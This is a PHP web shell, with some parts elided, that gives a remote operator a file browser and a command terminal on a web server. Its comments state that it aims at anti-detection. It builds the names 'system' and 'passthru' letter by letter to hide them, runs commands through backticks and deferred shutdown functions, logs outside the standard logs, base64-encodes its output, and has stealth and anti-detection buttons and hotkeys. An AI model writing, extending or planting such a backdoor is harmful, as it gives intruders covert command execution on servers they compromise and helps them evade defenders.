<?php
// Enhanced session management with anti-detection techniques
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_only_cookies', 1);

// Custom session name to avoid default PHPSESSID fingerprinting
session_name('SID_' . substr(md5(time()), 0, 8));
session_start();

// Generate random session ID prefix to avoid pattern detection
if (!isset($_SESSION['initialized'])) {
    ...
    if (!isset($_SESSION['current_dir']) || empty($_SESSION['current_dir'])) {
        $_SESSION['current_dir'] = getcwd();
    }
}

// Session hijacking protection
if ($_SESSION['fingerprint'] !== md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    session_destroy();
...
set_error_handler(function($severity, $message, $file, $line) {
    // Log to custom location to avoid standard logs
    $logFile = sys_get_temp_dir() . '/' . substr(md5(__FILE__), 0, 8) . '.log';
    $logEntry = date('[Y-m-d H:i:s]') . " Error: $message in $file on line $line\n";
...
// Track request times with sliding window
 $_SESSION['request_times'][] = time();
 $_SESSION['request_times'] = array_filter($_SESSION['request_times'], function($time) {
    return $time > (time() - 60); // Keep only last minute
});

// Dynamic rate limiting based on time of day
 $hour = (int)date('H');
 $rateLimit = ($hour >= 9 && $hour <= 17) ? 30 : 60; // Stricter during business hours

if (count($_SESSION['request_times']) > $rateLimit) {
    http_response_code(429);
    die("Rate limit exceeded");
}

// Advanced path validation with encoding checks
function validatePath($path) {
    // Check for various encoding bypass attempts
    $decodedPath = urldecode($path);
    $doubleDecodedPath = urldecode($decodedPath);
    
    // Check for path traversal in all variants
    $traversalPatterns = [
        '../', '..\\', '..%2f', '..%5c', 
        '%2e%2e%2f', '%2e%2e%5c', '%2e%2e/', '..%2f',
        '....//', '....\\\\', '..%252f', '..%255c'
    ];
    
    foreach ($traversalPatterns as $pattern) {
        if (stripos($path, $pattern) !== false || 
            stripos($decodedPath, $pattern) !== false || 
            stripos($doubleDecodedPath, $pattern) !== false) {
            return getcwd();
        }
    }
    
    // Additional null byte injection check
    if (strpos($path, "\0") !== false || strpos($decodedPath, "\0") !== false) {
        return getcwd();
    }
...
// Advanced command execution with multiple obfuscation techniques
function executeCommand($command) {
    $result = '';
    
    // Define variables outside the array
    $func = 's' . 'y' . 's' . 't' . 'e' . 'm';
    $func2 = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u';
    $var = 'system';
    $var2 = 'shell_exec';
    
    // Multiple execution methods with various obfuscation techniques
    $executionMethods = [
    ...
    // Using file_put_contents with php://output
    try {
        ob_start();
        file_put_contents('php://output', `$command`);
        $result = ob_get_clean();
        if (!empty($result)) {
            return $result;
        }
    ...
    try {
        $tempFile = tempnam(sys_get_temp_dir(), 'cmd_');
        register_shutdown_function(function() use ($command, $tempFile) {
            file_put_contents($tempFile, `$command`);
        });
        return "Command scheduled for execution";
    } catch (Exception $e) {
        // Continue to next method
    }
...
// Ensure current directory is always set and valid
if (!isset($_SESSION['current_dir']) || empty($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

 $currentDirectory = $_SESSION['current_dir'];

// Try to scan directory with enhanced error handling
 $directoryContents = ['.', '..']; // Default fallback
try {
    if (!empty($currentDirectory) && is_dir($currentDirectory)) {
        $scanned = scandir($currentDirectory);
        if ($scanned !== false) {
        ...
        $notification = 'Invalid directory path';
...
<div class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-3">
        ...
        <div>
            ...
            <button id="anti-detection" class="btn btn-sm btn-outline-warning ms-2">Anti-Detection</button>
        </div>
    </div>
    ...
    <?php if ($fileToView && $viewContent !== null): ?>
        <div class="mb-4">
            ...
            <div class="encoded-data">Base64: <?= base64_encode($viewContent) ?></div>
        </div>
    <?php endif; ?>
    ...
    <div class="terminal-section mb-4">
        ...
        <?php if ($commandResult): ?>
            ...
            <div class="encoded-data">Base64: <?= base64_encode($commandResult) ?></div>
        <?php endif; ?>
    </div>
...
<script>
    ...
    // Anti-detection mode
    document.getElementById('anti-detection').addEventListener('click', function() {
        document.body.classList.toggle('anti-screenshot');
        this.textContent = document.body.classList.contains('anti-screenshot') ? 'Detection Mode' : 'Anti-Detection';
    });
    ...
    document.addEventListener('keydown', function(e) {
        // Ctrl+Shift+S for stealth mode
        if (e.ctrlKey && e.shiftKey && e.key === 'S') {
            document.getElementById('stealth-toggle').click();
        }
        // Ctrl+Shift+A for anti-detection
        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
            document.getElementById('anti-detection').click();
        }
    });
</script>
</body>
